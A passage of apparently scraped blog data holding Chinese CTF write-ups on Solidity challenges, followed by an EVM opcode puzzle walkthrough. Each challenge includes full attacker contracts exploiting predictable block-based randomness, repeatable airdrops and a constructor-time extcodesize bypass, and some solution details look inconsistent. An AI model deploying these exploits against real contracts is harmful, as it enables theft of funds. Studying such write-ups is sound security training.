val)存储的就是func函数的函数体内存位置，所以只要改变跳转位置，就可以实现自由控制函数执行逻辑）","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"bad_randomness(1)","slug":"CTFS/ChainFlag/bad_randomness/bad_randomness","date":"2023-08-22T02:50:10.000Z","updated":"2023-08-22T02:50:10.000Z","comments":true,"path":"2023/08/22/CTFS/ChainFlag/bad_randomness/bad_randomness/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/22/CTFS/ChainFlag/bad_randomness/bad_randomness/","excerpt":"","text":"EOSGame1. question源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161/** *Submitted for verification at Etherscan.io on 2018-11-26*/pragma solidity ^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath &#123; /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the // benefit is lost if &#x27;b&#x27; is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b); return c; &#125; /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold return c; &#125; /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a); return c; &#125; /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b != 0); return a % b; &#125;&#125;contract EOSToken&#123; using SafeMath for uint256; string TokenName = &quot;EOS&quot;; uint256 totalSupply = 100**18; address owner; mapping(address =&gt; uint256) balances; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; constructor() public&#123; owner = msg.sender; balances[owner] = totalSupply; &#125; function mint(address _to,uint256 _amount) public onlyOwner &#123; require(_amount &lt; totalSupply); totalSupply = totalSupply.sub(_amount); balances[_to] = balances[_to].add(_amount); &#125; function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123; require(_amount &lt; balances[_from]); balances[_from] = balances[_from].sub(_amount); balances[_to] = balances[_to].add(_amount); &#125; function eosOf(address _who) public constant returns(uint256)&#123; return balances[_who]; &#125;&#125;contract EOSGame&#123; using SafeMath for uint256; mapping(address =&gt; uint256) public bet_count; uint256 FUND = 100; uint256 MOD_NUM = 20; uint256 POWER = 100; uint256 SMALL_CHIP = 1; uint256 BIG_CHIP = 20; EOSToken eos; event FLAG(string b64email, string slogan); constructor() public&#123; eos=new EOSToken(); &#125; function initFund() public&#123; if(bet_count[tx.origin] == 0)&#123; bet_count[tx.origin] = 1; eos.mint(tx.origin, FUND); &#125; &#125; function bet(uint256 chip) internal &#123; bet_count[tx.origin] = bet_count[tx.origin].add(1); uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin]))); uint256 lucky = lucky_hash % MOD_NUM; if (shark == lucky)&#123; eos.transfer(address(this), tx.origin, chip.mul(POWER)); &#125; &#125; function smallBlind() public &#123; eos.transfer(tx.origin, address(this), SMALL_CHIP); bet(SMALL_CHIP); &#125; function bigBlind() public &#123; eos.transfer(tx.origin, address(this), BIG_CHIP); bet(BIG_CHIP); &#125; function eosBlanceOf() public view returns(uint256) &#123; return eos.eosOf(tx.origin); &#125; function CaptureTheFlag(string b64email) public&#123; require (eos.eosOf(tx.origin) &gt; 18888); emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;); &#125;&#125; 📌 成功调用CaptureTheFlag()。 2. analysis 老问题了，在bet()函数中，函数体中的值可以提前计算，并且每次调用此函数，赌博次数bet_count就会加一，以此来控制不能再一笔交易中完成攻击，但，可以进行无数次的攻击，当然，你足够有钱的话。 在攻击合约中，设置一个自增的全局变量，可以辅组计算。 计算代码： 123456789bet_counter++;uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));uint256 shark = seed_hash % MOD_NUM;uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_counter)));uint256 lucky = lucky_hash % MOD_NUM;require(shark == lucky, &quot;shark != luck, try again...&quot;); 3. solve部署合约之后，多次调用attack()函数，直到调用者的余额大于18888为止，没办法，攻击需要攻击很多次，大部分都是会报错，毕竟每一次攻击只有1/20的概率成功。 攻击合约 12345678910111213141516171819202122232425262728293031contract Hacker &#123; EOSGame game; uint256 MOD_NUM = 20; uint bet_counter = 1; constructor(address _game) public &#123; game = EOSGame(_game); // 类似空投，获取 100 tokens game.initFund(); &#125; function attack() public &#123; bet_counter++; uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_counter))); uint256 lucky = lucky_hash % MOD_NUM; require(shark == lucky, &quot;shark != luck, try again...&quot;); game.bigBlind(); &#125; function isComplete() public &#123; game.CaptureTheFlag(&quot;hacker&quot;); &#125;&#125; 总结 这道题考察的是随机数的控制，还算比较简单。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"airdrop_hunting(3)","slug":"CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)","date":"2023-08-21T08:50:10.000Z","updated":"2023-08-21T08:50:10.000Z","comments":true,"path":"2023/08/21/CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/21/CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)/","excerpt":"","text":"CoinFlip1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990pragma solidity ^0.4.24;contract P_Bank&#123; mapping (address =&gt; uint) public balances; uint public MinDeposit = 0.1 ether; Log TransferLog; event FLAG(string b64email, string slogan); constructor(address _log) public &#123; TransferLog = Log(_log); &#125; function Ap() public &#123; if(balances[msg.sender] == 0) &#123; balances[msg.sender]+=1 ether; &#125; &#125; function Transfer(address to, uint val) public &#123; if(val &gt; balances[msg.sender]) &#123; revert(); &#125; balances[to]+=val; balances[msg.sender]-=val; &#125; function CaptureTheFlag(string b64email) public returns(bool)&#123; require (balances[msg.sender] &gt; 500 ether); emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;); &#125; function Deposit() public payable &#123; if(msg.value &gt; MinDeposit) &#123; balances[msg.sender]+= msg.value; TransferLog.AddMessage(msg.sender,msg.value,&quot;Deposit&quot;); &#125; &#125; function CashOut(uint _am) public &#123; if(_am&lt;=balances[msg.sender]) &#123; if(msg.sender.call.value(_am)()) &#123; balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,&quot;CashOut&quot;); &#125; &#125; &#125; function() public payable&#123;&#125; &#125;contract Log &#123; struct Message &#123; address Sender; string Data; uint Val; uint Time; &#125; string err = &quot;CashOut&quot;; Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data) public &#123; LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); &#125;&#125; 📌 目标：成功调用CaptureTheFlag() 2. analysis 比较简单，注意到空投函数AP()，其要求调用者的余额balance小于1ether即可调用，但是如果某人拥有两个账户，那便可以无限取钱了。 3. solve攻击合约： 1234567891011121314151617181920212223242526272829303132333435contract Helper &#123; address hacker; P_Bank bank; constructor(address _bank) public &#123; hacker = msg.sender; bank = P_Bank(_bank); &#125; function attack() public &#123; bank.Ap(); bank.Transfer(hacker, 1 ether); &#125;&#125;contract Hacker &#123; P_Bank bank; Helper helper; constructor(address _bank) public &#123; bank = P_Bank(_bank); helper = new Helper(_bank); &#125; function attack() public &#123; for (uint i; i &lt; 501; i++) &#123; helper.attack(); &#125; // CaptureTheFlag() 成功执行之后，默认返回false require(!bank.CaptureTheFlag(&quot;&quot;), &quot;you don&#x27;t capture...&quot;); &#125;&#125; 📌 注意：调用Hacker.attack()时，需要将gaslimit调高 攻击成功： Fake3d1. question123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138/** *Submitted for verification at Etherscan.io on 2018-11-27*/pragma solidity ^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath &#123; /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the // benefit is lost if &#x27;b&#x27; is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b); return c; &#125; /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold return c; &#125; /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a); return c; &#125; /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b != 0); return a % b; &#125;&#125;contract WinnerList&#123; address owner; struct Richman&#123; address who; uint balance; &#125; function note(address _addr, uint _value) public&#123; Richman rm; rm.who = _addr; rm.balance = _value; &#125; &#125;contract Fake3D &#123; using SafeMath for *; mapping(address =&gt; uint256) public balance; uint public totalSupply = 10**18; WinnerList wlist; event FLAG(string b64email, string slogan); constructor(address _addr) public&#123; wlist = WinnerList(_addr); &#125; modifier turingTest() &#123; address _addr = msg.sender; uint256 _codeLength; assembly &#123;_codeLength := extcodesize(_addr)&#125; require(_codeLength == 0, &quot;sorry humans only&quot;); _; &#125; function transfer(address _to, uint256 _amount) public&#123; require(balance[msg.sender] &gt;= _amount); balance[msg.sender] = balance[msg.sender].sub(_amount); balance[_to] = balance[_to].add(_amount); &#125; function airDrop() public turingTest returns (bool) &#123; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123; balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; &#125; else return false; &#125; function CaptureTheFlag(string b64email) public&#123; require (balance[msg.sender] &gt; 8888); wlist.note(msg.sender,balance[msg.sender]); emit FLAG(b64email, &quot;Congratulations to capture the flag?&quot;); &#125;&#125; 📌 目标：成功调用CaptureTheFlag() 2. analysis 这题嘛，思路不难，就是麻烦。 要想成功调用CaptureTheFlag()，调用者的balance必须大于 8888，而能获取balance函数为airDrop()，但是其被一个修饰器限制。 修饰器： 1234567modifier turingTest() &#123; address _addr = msg.sender; uint256 _codeLength; assembly &#123;_codeLength := extcodesize(_addr)&#125; require(_codeLength == 0, &quot;sorry humans only&quot;); _;&#125; 修饰器规定，调用者地址的代码大小为0，即要求调用者为EOA账户，但是也不全是，还有一种操作也可以让其代码大小为0，在构造函数调用被此修饰器的函数时，合约还在初始化，通过extcodesize获取到的代码大小为0，这样一来就有路子了。 再分析airDrop(): 123456789101112131415161718function airDrop() public turingTest returns (bool) &#123; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123; balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; &#125; else return false;&#125; 根据区块链信息，计算出种子，当然，这些全局变量block.timestamp，block.difficulty，block.coinbase，block.gaslimit，now，再同一个区块中他们的值是相同的，也就意味着，可以事先计算出种子seed，即在同一个函数中，可以先计算出种子，再调用此函数，其生成的seed相同。 由于gas不足引起的错误的代码： 123456789101112131415161718192021222324252627contract Hacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(address(this))))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the seed bigger than 288, please try again...&quot;); for (uint i; i &lt; 889; i++) &#123; fake.airDrop(); &#125; fake.CaptureTheFlag(&quot;&quot;); &#125;&#125; 尽管，我已经将gaslimit设置到了：3000000000 按理来说，按照这个思路，攻击合约已经出来了，但是，由于涉及的balance数目太大，在单笔交易中无法正常执行，所以只能通过多次部署合约获取空投，又因为空投集中发放给tx.origin，到该账户的balance大于8888时，需要tx.origin亲自去调用CaptureTheFlag()。 3. solve一直部署该合约，直到成功部署十次为止 123456789101112131415161718192021222324252627contract Hacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(address(this))))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the seed bigger than 288, please try again...&quot;); for (uint i; i &lt; 90; i++) &#123; fake.airDrop(); &#125; &#125;&#125; 如图： 其实当初的做法还是有点繁琐了，也不知道是不是科技进步了其实是可以一次性完成的，只要成功部署如下合约即可 1234567891011121314151617181920212223242526contract Fake3DHacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the result of the calculation is not less than 288&quot;); for(uint i; i &lt; 889; i++) &#123; fake.airDrop(); &#125; &#125;&#125; babybet1. question源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162pragma solidity ^0.4.23;contract babybet &#123; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public status; address owner; //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough. //Gmail is ok. 163 and qq may have some problems. event sendflag(string md5ofteamtoken,string b64email); constructor()public&#123; owner = msg.sender; balance[msg.sender]=1000000; &#125; //pay for flag function payforflag(string md5ofteamtoken,string b64email) public&#123; require(balance[msg.sender] &gt;= 1000000); if (msg.sender!=owner)&#123; balance[msg.sender]=0;&#125; owner.transfer(address(this).balance); emit sendflag(md5ofteamtoken,b64email); &#125; modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; //get_profit function profit()&#123; require(status[msg.sender]==0); balance[msg.sender]+=10; status[msg.sender]=1; &#125; //add money function () payable&#123; balance[msg.sender]+=msg.value/1000000000000000000; &#125; //bet function bet(uint num) &#123; require(balance[msg.sender]&gt;=10); require(status[msg.sender]&lt;2); balance[msg.sender]-=10; uint256 seed = uint256(blockhash(block.number-1)); uint rand = seed % 3; if (rand == num) &#123; balance[msg.sender]+=1000; &#125; status[msg.sender]=2; &#125; //transfer function transferbalance(address to,uint amount)&#123; require(balance[msg.sender]&gt;=amount); balance[msg.sender]-=amount; balance[to]+=amount; &#125;&#125; 📌 目标：成功调用payforflag() 2. analysis 思路大差不差，通过两个合约代码，生成多个Helper帮助Hacker积攒balance。 又因为rand是可控的，所以可以提前计算随机数，再根据随机数进行赌博，，，所以啊不要赌博，十赌九输。 3. solve攻击方式，部署Hacker，成功调用2次attack()，再调用pwn()。 1234567891011121314151617181920212223242526272829303132333435contract BabyBetHacker &#123; babybet bet; constructor(address _bet) public &#123; bet = babybet(_bet); &#125; function attack() public &#123; uint256 seed = uint256(blockhash(block.number-1)); uint rand = seed % 3; for (uint i; i &lt; 500; i++) &#123; new BabyBetHelper(address(bet), rand); &#125; &#125; function pwn() public &#123; bet.payforflag(&quot;BYYQ1030Hacker&quot;, &quot;BYYQ&quot;); &#125;&#125;contract BabyBetHelper &#123; babybet bet; constructor(address _bet, uint answer) public &#123; bet = babybet(_bet); bet.profit(); bet.bet(answer); bet.transferbalance(msg.sender, 1000); &#125;&#125; 总结区块链上的一些信息是具有共性的，比如在同一个函数中调用了较多函数，且这是被调用函数中都涉及到了一些区块信息，比如block.number，now等，但是只有在一个区块中这些值都是相等的，意味着某些随机数并不随机。。。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"EVM_Puzzles","slug":"CTFS/EVM puzzles/EVM_Puzzles","date":"2023-08-19T02:23:10.000Z","updated":"2023-08-19T02:23:10.000Z","comments":true,"path":"2023/08/19/CTFS/EVM puzzles/EVM_Puzzles/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/19/CTFS/EVM%20puzzles/EVM_Puzzles/","excerpt":"","text":"前言 How to play? 到 GitHub仓库 将整个文件克隆到本地。 在终端依次执行如下指令： 1npm install 1npx harhat play 一个方便测试的 在线网站 操作码大全 1. puzzle_01源码： 1234567891011121314############# Puzzle 1 #############00 34 CALLVALUE01 56 JUMP02 FD REVERT03 FD REVERT04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 5B JUMPDEST09 00 STOP 分析： CALLVALUE表示传入的msg.value，其单位是wei； JUMP则是表示调转到JUMPDEST标志的位置，比如在本题中CALLVALUE &#x3D; 5，则会执行0x05位置的代码，不出所料应该是会报错的。 所以本题只要发送8，则可以成功执行。 结果： 2. puzzle_02源码： 1234567891011121314############# Puzzle 2 #############00 34 CALLVALUE01 38 CODESIZE02 03 SUB03 56 JUMP04 FD REVERT05 FD REVERT06 5B JUMPDEST07 00 STOP08 FD REVERT09 FD REVERT 分析： CALLVALUE和上一题一样，CODESIZE则表示代码的大小，而从题目中不难看出09表示代码大小为10bytes，而CODESIZE的单位也是bytes，所以CODESIZE的值是10。 这里和逆波兰表达有点区别，这里的减法表示的是：当读取到SUB操作码时，EVM读取栈的顺序为：CODESIZE SUB CALLVALUE 即 10 - CALLVALUE，要使本题成功执行，则需跳转到06，10 - CALLVALUE = 06，所以不难得出CALLVALUE &#x3D; 4。 结果： 3. puzzle_03源码： 12345678910############# Puzzle 3 #############00 36 CALLDATASIZE01 56 JUMP02 FD REVERT03 FD REVERT04 5B JUMPDEST05 00 STOP 分析： 还是为了跳转到被JUMPDEST标志的04栈的位置，而CALLDATASIZE则是统计calldata数据的长度，所以只需随便发送一个4bytes的数据即可，因为只能发送十六进制，且在十六进制中两位数字表示1bytes，所以简单设置calldata = 0x00000000即可。 结果： 4. puzzle_04源码： 12345678910111213141516############# Puzzle 4 #############00 34 CALLVALUE01 38 CODESIZE02 18 XOR03 56 JUMP04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 FD REVERT09 FD REVERT0A 5B JUMPDEST0B 00 STOP 分析： 重点是XOR，其表示按位异或。不难看出CODESIZE&#x3D; 12，通关条件为CALLVALUE ^ CODESIZE = a = 10 = 1010，通过简单的计算不难算出CALLVALUE的值。 123CODESIZE 1100JUMPDEST 1010CALLVALUE 0110 所以发送6，即可通关。 结果： 5. puzzle_05源码： 1234567891011121314151617############# Puzzle 5 #############00 34 CALLVALUE01 80 DUP102 02 MUL03 610100 PUSH2 010006 14 EQ07 600C PUSH1 0C09 57 JUMPI0A FD REVERT0B FD REVERT0C 5B JUMPDEST0D 00 STOP0E FD REVERT0F FD REVERT 分析： DUP1：复制堆栈中的第一个值并将其推入堆栈的第一个位置（DUP2：表示复制第二个值，并将其推入堆栈的第一个位置，其他同理）； MUL：表示将前两个值进行相乘并压入栈； PUSH2 0100：表示将0100这两个字节的值压入栈顶，PUSH1, PUSH3,PUSH4...表示压入几个字节，最大压入32bytes，即PUSH32; EQ：弹出前两个值，比较其值是否相同，如果相同则压入1，否则压入0； PUSH1 0C：表示将一个字节的0c压入栈顶； JUMPI：当JUMPI执行时，它会从堆栈中弹出 2 个值。第一个值将是要跳转到的新程序计数器（一如既往，它必须是有效JUMPDEST指令）。第二个值是一个布尔标志（0 或 1），用于评估是否必须跳转。如果值为1则跳转；否则继续执行下一条指令。 综上，要是执行到JUMPI指令之前，栈中元素为 00:0c 01:01 只要执行 CALLVALUE DUP1 MUL PUSH2 0100 EQ之后，返回的值是true，即可通过（CALLVALUE ^ CALLVALUE &#x3D;&#x3D; 0x0100 &#x3D; 16 ^ 2 &#x3D; 256），所以发送16便可以通关。 结果： 6. puzzle_06源码： 12345678910111213141516############# Puzzle 6 #############00 6000 PUSH1 0002 35 CALLDATALOAD03 56 JUMP04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 FD REVERT09 FD REVERT0A 5B JUMPDEST0B 00 STOP 分析： PUSH1 00：往栈中压入 0bytes； CALLDATALOAD：表示从指定位置开始读取32bytes的数据，题中则是表示偏移量为0，即从索引为0的坐标开始读取32bytes的数据，读取到的数据的值为0a，即可通关。 结果： 7. puzzle_07源码： 1234567891011121314151617181920############# Puzzle 7 #############00 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY05 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE0B 3B EXTCODESIZE0C 6001 PUSH1 010E 14 EQ0F 6013 PUSH1 1311 57 JUMPI12 FD REVERT13 5B JUMPDEST14 00 STOP 分析： p1: 123400 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY 三个堆栈输入分别是 destOffset：将复制结果的内存中的字节偏移量。 offset：要复制的调用数据中的字节偏移量。 size：要复制的字节大小。 CALLDATACOPY就像一个“特殊”MLOAD，直接从 calldata 位置获取要存储在内存中的数据。这些指令的意思是：从 calldata 中取出所有数据并将其复制到从内存位置 0 开始的内存中。 p2: 123405 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE 它的堆栈输入分别是： value：以Wei为单位的值发送到新帐户。 offset：内存中的字节偏移量（以字节为单位），新帐户的初始化代码。 size：要复制的字节大小（初始化代码的大小）。 堆栈输出： address：已部署合约的地址，如果部署失败，则为 0。 p3: 123450B 3B EXTCODESIZE0C 6001 PUSH1 010E 14 EQ0F 6013 PUSH1 1311 57 JUMPI EXTCODESIZE获取已部署合约的大小（以字节为单位）并将其添加到堆栈中。之后，谜题检查已部署合约的大小是否等于值 1。如果是，我们按照 到达该JUMPI位置13并赢得挑战。 The solution is to find a calldata value for which the result of EXTCODESIZE (done on the contract deployed with code from the calldata itself) return 1. 具体分析博客可见如下大佬博客： link1 link2 重点： When the CREATE opcode is executed, only the code returned by the RETURN opcode will be the “runtime code” that will be executed in the future when the deployed contract will be called. The other part of the bytecode is just used once, only for the constructor part. *个人见解：通过create操作码创建的合约地址，[...] 创建代码在事务中执行，该事务返回运行时代码的副本，这是合约的实际代码。正如我们将看到的，构造函数是创建代码的一部分，而不是运行时代码的一部分。合约的构造函数是创建代码的一部分；一旦部署，它就不会出现在合约的代码中。，实际上初始化合约的代码指令为执行calldata之后，**通过执行calldata中的RETURN语句返回的代码才是将来调用部署的合约时执行的runtime code*。 分析RETURN: 从开始读取位置的内存偏移量 要读取和返回的内存大小（以字节为单位） 简单来说，其返回的值是从memory中读取的，从哪读取，读取多少取决于offset,size。 所以，只要按要求拼接自定义calldata即可，原则是：将一条指令写入memory，且通过RETURN从memory中返回这一条指令用于初始化合约，这样一来，合约中便只有一条代码，EXTCODESIZE返回的值便是1。 12345678910## 拼接calldata #### 将calldata写入memoryPUSH1 60 ff ## mstore&#x27;value,只要是一个字节即可PUSH1 60 00 ## mstore&#x27;offset,在memory内存中的存储起始索引## 这里采用MSTORE8，这在memory中的存储方式为：0xff00000000000...(32位)MSTORE8 53 ## MSTORE8 操作码，在memory中写入1bytes## 从memory中返回代码，用来执行合约的初始化PUSH1 60 01 ## RETURN&#x27;size,从memory中读取代码的大小(长度)PUSH1 60 00 ## RETURN&#x27;offset,从memory中读取代码的起始索引RETURN f3 ## RETURN 操作码,从memory中返回runtime code 所以，构造出来的calldata便是： 10x60ff60005360016000f3 结果： (如下这个结果同理也可以，0x60ff6000526001601ff3) 8. puzzle_08源码： 123456789101112131415161718192021222324252627############# Puzzle 8 #############00 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY05 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE0B 6000 PUSH1 000D 80 DUP10E 80 DUP10F 80 DUP110 80 DUP111 94 SWAP512 5A GAS13 F1 CALL14 6000 PUSH1 0016 14 EQ17 601B PUSH1 1B19 57 JUMPI1A FD REVERT1B 5B JUMPDEST1C 00 STOP 分析： p1: 123400 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY 将calldata拷贝到memory中。 p2: 123405 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE 根据拷贝在memory中的calldata创建合约地址。 p3: 123456780B 6000 PUSH1 000D 80 DUP10E 80 DUP10F 80 DUP110 80 DUP111 94 SWAP512 5A GAS13 F1 CALL SWAP5:将栈顶的00与CRETAE创建的合约地址交换位置。 分析CALL: gas: the amount of gas to send to the sub context created for the execution. address: the address on which the context will be executed value: value in wei to send to the address argsOffset: byte offset in the memory in number of bytes argsSize: byte size to copy from the memory with the previously specified offset retOffset: byte offset in memory in bytes from which you want to store the return data returned by the execution retSize: byte size to copy from the returned data p4: 123414 6000 PUSH1 0016 14 EQ17 601B PUSH1 1B19 57 JUMPI 即要求合约调用失败，EQ的返回值才为1，程序才可以正确执行。 所以只要本着调用失败去实现即可，又FD REVERT，所以可以在puzzles_7的基础上进行修改即可。 用于初始化的指令为FD，则有 1calldata = 0x60fd60005360016000f3 结果： 9. puzzle_09源码： 12345678910111213141516171819202122############# Puzzle 9 #############00 36 CALLDATASIZE01 6003 PUSH1 0303 10 LT04 6009 PUSH1 0906 57 JUMPI07 FD REVERT08 FD REVERT09 5B JUMPDEST0A 34 CALLVALUE0B 36 CALLDATASIZE0C 02 MUL0D 6008 PUSH1 080F 14 EQ10 6014 PUSH1 1412 57 JUMPI13 FD REVERT14 5B JUMPDEST15 00 STOP 分析： p1: 1234500 36 CALLDATASIZE01 6003 PUSH1 0303 10 LT04 6009 PUSH1 0906 57 JUMPI 要求calldata的长度小于3bytes（LT表示小于） p2: 12345670A 34 CALLVALUE0B 36 CALLDATASIZE0C 02 MUL0D 6008 PUSH1 080F 14 EQ10 6014 PUSH1 1412 57 JUMPI 通过p1之后，要求&#96;msg.value ^ calldatasize &#x3D;&#x3D; 0x08。 简单，令calldata = 0x00000006，msg.sender = 2 结果： 10. puzzle_10源码： 123456789101112131415161718192021222324252627############## Puzzle 10 ##############00 38 CODESIZE01 34 CALLVALUE02 90 SWAP103 11 GT04 6008 PUSH1 0806 57 JUMPI07 FD REVERT08 5B 